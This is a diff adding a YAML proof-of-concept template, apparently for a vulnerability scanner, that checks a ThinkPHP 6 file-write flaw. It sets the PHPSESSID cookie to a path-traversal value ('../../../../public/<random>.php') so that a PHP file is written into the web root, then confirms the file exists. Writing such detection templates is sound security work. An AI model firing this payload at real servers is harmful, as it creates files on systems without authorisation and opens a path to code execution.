@@ -1,0 +1,43 @@
+id: poc-yaml-thinkphp-v6-file-write
+info:
+  name: Thinkphp V6 文件写入漏洞
+  severity: medium
+  tags:
+  - 文件写入
+  finger: ThinkPHP
+  reference: []
+  description: null
+variables:
+  f1: random_int(100000, 900000)
+transport: http
+requests:
+- method: GET
+  path: /{{.f1}}.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 404
+  output: []
+- method: GET
+  path: /
+  headers:
+    Cookie: PHPSESSID=../../../../public/{{.f1}}.php
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "set-cookie") && contains(headers,
+    f1)
+  output: []
+- method: GET
+  path: /{{.f1}}.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "text/html")
+  output: []
